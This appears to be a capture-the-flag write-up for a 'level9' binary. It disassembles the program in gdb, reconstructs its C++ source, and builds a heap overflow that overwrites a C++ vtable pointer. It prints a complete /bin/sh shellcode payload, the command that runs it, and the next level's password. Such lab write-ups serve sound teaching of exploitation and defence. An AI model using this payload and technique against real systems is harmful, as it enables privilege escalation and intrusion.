What do we have?

	$ ll
	total 17
	dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 ./
	dr-x--x--x  1 root   root    340 Sep 23  2015 ../
	-rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
	-rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
	-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9*
	-rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
	-rw-r--r--  1 level9 level9  675 Apr  3  2012 .profile

A `level9` binary.

	$ gdb ./level9
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x080485f4 <+0>:	push   %ebp
	0x080485f5 <+1>:	mov    %esp,%ebp
	0x080485f7 <+3>:	push   %ebx
	=> 0x080485f8 <+4>:	and    $0xfffffff0,%esp
	0x080485fb <+7>:	sub    $0x20,%esp
	0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
	0x08048602 <+14>:	jg     0x8048610 <main+28>
	0x08048604 <+16>:	movl   $0x1,(%esp)
	0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
	0x08048610 <+28>:	movl   $0x6c,(%esp)
	0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
	0x0804861c <+40>:	mov    %eax,%ebx
	0x0804861e <+42>:	movl   $0x5,0x4(%esp)
	0x08048626 <+50>:	mov    %ebx,(%esp)
	0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
	0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
	0x08048632 <+62>:	movl   $0x6c,(%esp)
	0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
	0x0804863e <+74>:	mov    %eax,%ebx
	0x08048640 <+76>:	movl   $0x6,0x4(%esp)
	0x08048648 <+84>:	mov    %ebx,(%esp)
	0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
	0x08048650 <+92>:	mov    %ebx,0x18(%esp)
	0x08048654 <+96>:	mov    0x1c(%esp),%eax
	0x08048658 <+100>:	mov    %eax,0x14(%esp)
	0x0804865c <+104>:	mov    0x18(%esp),%eax
	0x08048660 <+108>:	mov    %eax,0x10(%esp)
	0x08048664 <+112>:	mov    0xc(%ebp),%eax
	0x08048667 <+115>:	add    $0x4,%eax
	0x0804866a <+118>:	mov    (%eax),%eax
	0x0804866c <+120>:	mov    %eax,0x4(%esp)
	0x08048670 <+124>:	mov    0x14(%esp),%eax
	0x08048674 <+128>:	mov    %eax,(%esp)
	0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
	0x0804867c <+136>:	mov    0x10(%esp),%eax
	0x08048680 <+140>:	mov    (%eax),%eax
	0x08048682 <+142>:	mov    (%eax),%edx
	0x08048684 <+144>:	mov    0x14(%esp),%eax
	0x08048688 <+148>:	mov    %eax,0x4(%esp)
	0x0804868c <+152>:	mov    0x10(%esp),%eax
	0x08048690 <+156>:	mov    %eax,(%esp)
	0x08048693 <+159>:	call   *%edx
	0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
	0x08048698 <+164>:	leave  
	0x08048699 <+165>:	ret    
	End of assembler dump.

	(gdb) info functions
	All defined functions:

	Non-debugging symbols:
	[...]
	0x080486f6  N::N(int)
	0x0804870e  N::setAnnotation(char*)
	0x0804873a  N::operator+(N&)
	0x0804874e  N::operator-(N&)

	(gdb) disas 0x080486f6
	Dump of assembler code for function _ZN1NC2Ei:
	0x080486f6 <+0>:	push   %ebp
	0x080486f7 <+1>:	mov    %esp,%ebp
	0x080486f9 <+3>:	mov    0x8(%ebp),%eax
	0x080486fc <+6>:	movl   $0x8048848,(%eax)
	0x08048702 <+12>:	mov    0x8(%ebp),%eax
	0x08048705 <+15>:	mov    0xc(%ebp),%edx
	0x08048708 <+18>:	mov    %edx,0x68(%eax)
	0x0804870b <+21>:	pop    %ebp
	0x0804870c <+22>:	ret    
	End of assembler dump.
	(gdb) disas 0x0804870e
	Dump of assembler code for function _ZN1N13setAnnotationEPc:
	0x0804870e <+0>:	push   %ebp
	0x0804870f <+1>:	mov    %esp,%ebp
	0x08048711 <+3>:	sub    $0x18,%esp
	0x08048714 <+6>:	mov    0xc(%ebp),%eax
	0x08048717 <+9>:	mov    %eax,(%esp)
	0x0804871a <+12>:	call   0x8048520 <strlen@plt>
	0x0804871f <+17>:	mov    0x8(%ebp),%edx
	0x08048722 <+20>:	add    $0x4,%edx
	0x08048725 <+23>:	mov    %eax,0x8(%esp)
	0x08048729 <+27>:	mov    0xc(%ebp),%eax
	0x0804872c <+30>:	mov    %eax,0x4(%esp)
	0x08048730 <+34>:	mov    %edx,(%esp)
	0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
	0x08048738 <+42>:	leave  
	0x08048739 <+43>:	ret    
	End of assembler dump.
	(gdb) disas 0x0804873a
	Dump of assembler code for function _ZN1NplERS_:
	0x0804873a <+0>:	push   %ebp
	0x0804873b <+1>:	mov    %esp,%ebp
	0x0804873d <+3>:	mov    0x8(%ebp),%eax
	0x08048740 <+6>:	mov    0x68(%eax),%edx
	0x08048743 <+9>:	mov    0xc(%ebp),%eax
	0x08048746 <+12>:	mov    0x68(%eax),%eax
	0x08048749 <+15>:	add    %edx,%eax
	0x0804874b <+17>:	pop    %ebp
	0x0804874c <+18>:	ret    
	End of assembler dump.
	(gdb) disas 0x0804874e
	Dump of assembler code for function _ZN1NmiERS_:
	0x0804874e <+0>:	push   %ebp
	0x0804874f <+1>:	mov    %esp,%ebp
	0x08048751 <+3>:	mov    0x8(%ebp),%eax
	0x08048754 <+6>:	mov    0x68(%eax),%edx
	0x08048757 <+9>:	mov    0xc(%ebp),%eax
	0x0804875a <+12>:	mov    0x68(%eax),%eax
	0x0804875d <+15>:	mov    %edx,%ecx
	0x0804875f <+17>:	sub    %eax,%ecx
	0x08048761 <+19>:	mov    %ecx,%eax
	0x08048763 <+21>:	pop    %ebp
	0x08048764 <+22>:	ret    
	End of assembler dump.

Ah, that's C++. Let's use a little bit of `Ghidra` plus `ChatGPT` to reconstruct the source file.

	#include <cstring>
	#include <cstdlib>
	#include <cstdio>

	class	N
	{
		public:
			char	annotation[100];
			int		value;

			N(int val) : value(val)
				{ }
			void setAnnotation(char *str)
				{ memcpy(annotation, str, strlen(str)); }
			int operator+(N &rhs)
				{ return this->value + rhs.value; }
			int operator-(N &rhs)
				{ return this->value - rhs.value; }
	};

	int	main(int argc, char **argv)
	{
		if (argc < 2)
			exit(1);
		N	*a = new N(5);
		N	*b = new N(6);
		a->setAnnotation(argv[1]);
		(void)(*b + *a);
		return (0);
	}

`(void)(*b + *a);` is a call to the `operator+` function of `b`, but we can see in the assembly that it's called like this: `call *%edx` (+159), and its content is loaded from `eax` (+142). It means we can overwrite `eax` to control the function that will be triggered by the call to `edx`. There is no `system` or the likes there, so we'll use some shellcode that we can store in the buffer of `b`.

First, let's get the offset for `eax` with the pattern generator we used in earlier exercises (https://wiremask.eu/tools/buffer-overflow-pattern-generator/).

	$ gdb ./level9
	[...]
	(gdb) b main
	[...]
	(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
	[...]
	(gdb) n
	Single stepping until exit from function main,
	which has no line number information.

	Program received signal SIGSEGV, Segmentation fault.
	0x08048682 in main ()
	(gdb) i r
	eax            0x41366441	1094083649
	ecx            0x67413567	1732326759
	edx            0x804a0d4	134521044
	ebx            0x804a078	134520952
	esp            0xbffff640	0xbffff640
	ebp            0xbffff668	0xbffff668
	esi            0x0	0
	edi            0x0	0
	eip            0x8048682	0x8048682 <main+142>
	eflags         0x210287	[ CF PF SF IF RF ID ]
	cs             0x73	115
	ss             0x7b	123
	ds             0x7b	123
	es             0x7b	123
	fs             0x0	0
	gs             0x33	51

With `0x41366441`, the pattern generator tells us the offset is at 108. We'll use the same shellcode as previous exercises: `\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80` (http://shell-storm.org/shellcode/files/shellcode-219.html), which is 55 bytes. 108 - 55 = 53 fillers characters needed (`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab`). To that, we'll append the address of the buffer of `a`, which contains our shellcode.

	$ ltrace ./level9
	[...]
	memcpy(0x0804a00c, "a", 1)                                                            = 0x0804a00c
	[...]
	+++ exited (status 11) +++

`0x0804a00c` => `\x0c\xa0\x04\x08`. `\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab\x0c\xa0\x04\x08`

	$ ./level9 $'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab\x0c\xa0\x04\x08'
	Segmentation fault (core dumped)

Ah... With a quick look of gdb, we saw that the segfault happened at an address equal to the bytes of our shellcode
(`0xdb310c31`). The logical reason is that it's somehow treated as a pointer, so we'll give the address of the buffer + 4 (`0x0804a00c` + 4 = `0x804a010` => `\x10\xa0\x04\x08`) at the start of the buffer, without forgetting to remove 4 bytes to the fillers.

	$ ./level9 $'\x10\xa0\x04\x08\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5A\x0c\xa0\x04\x08'
	$ cat /home/user/bonus0/.pass
	f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

A quick slap to `ChatGPT` mentions the concept of `vTable` (https://www.geeksforgeeks.org/cpp/vtable-and-vptr-in-cpp/; https://en.wikipedia.org/wiki/Virtual_method_table). Well, now we know why.
